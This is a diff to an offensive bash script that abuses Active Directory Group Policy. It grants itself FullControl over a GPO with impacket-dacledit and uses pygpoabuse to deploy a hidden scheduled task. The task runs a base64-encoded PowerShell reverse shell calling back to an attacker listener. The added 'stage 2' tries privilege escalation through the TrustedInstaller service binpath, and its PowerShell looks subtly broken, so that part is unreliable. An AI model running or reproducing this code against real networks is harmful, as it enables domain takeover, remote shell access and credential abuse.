@@ -12,7 +12,11 @@ domain_prefix="$(echo $domain | cut -d'.' -f1)"
 domain_suffix="$(echo $domain | cut -d'.' -f2)"
 gpo_ldap_query="CN={$gpo_guid},CN=Policies,CN=System,DC=$domain_prefix,DC=$domain_suffix"
 
-payload=$(python3 -c "import base64; print(base64.b64encode((r\"\"\"\$client = New-Object System.Net.Sockets.TCPClient(\"$listener_ip\",$listener_port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"\"\").encode(\"utf-16-le\")).decode())")
+# Stage 1: basic PowerShell reverse shell, already running as NT AUTHORITY\SYSTEM because of how GPOs work
+payload_stage1=$(python3 -c "import base64; print(base64.b64encode((r\"\"\"\$client = New-Object System.Net.Sockets.TCPClient(\"$listener_ip\",$listener_port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"\"\").encode(\"utf-16-le\")).decode())")
+
+# Stage 2: elevate the payload's token to TrustedInstaller privileges using service binary paths
+payload_stage2=$(python3 -c "import base64; print(base64.b64encode((r\"\"\"\$sc.exe config \"TrustedInstaller\" binpath= \"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\"; \$ti = Get-Service \"TrustedInstaller\"; \$ti.start(@(\"-ep\", \"bypass\", \"-WindowStyle\", \"Hidden\", \"-c\", \"Start-Process 'powershell.exe' \-ArgumentList '-ep bypass -WindowStyle Hidden -e $payload_stage1'\"))\"\"\").encode(\"utf-16-le\")).decode())")
 
 if [ -d "backupgpo" ]
 then
@@ -26,13 +30,13 @@ then
 
   gpowned -u $user -hashes :$password -d $domain -dc-ip $target_ip -gpcmachine -backup backupgpo -name "{$gpo_guid}"
 
-  pygpoabuse -hashes :$password $domain/$user -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
+  pygpoabuse -hashes :$password $domain/$user -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload_stage2" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
 else
   impacket-dacledit -principal $user -target-dn="$gpo_ldap_query" -dc-ip $target_ip $domain/$user:$password -action write -rights FullControl
 
   gpowned -u $user -p $password -d $domain -dc-ip $target_ip -gpcmachine -backup backupgpo -name "{$gpo_guid}"
 
-  pygpoabuse $domain/$user:$password -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
+  pygpoabuse $domain/$user:$password -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload_stage2" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
 fi
 
 echo -e "\nBe patient: this reverse shell could take as long as 30 minutes to come back"
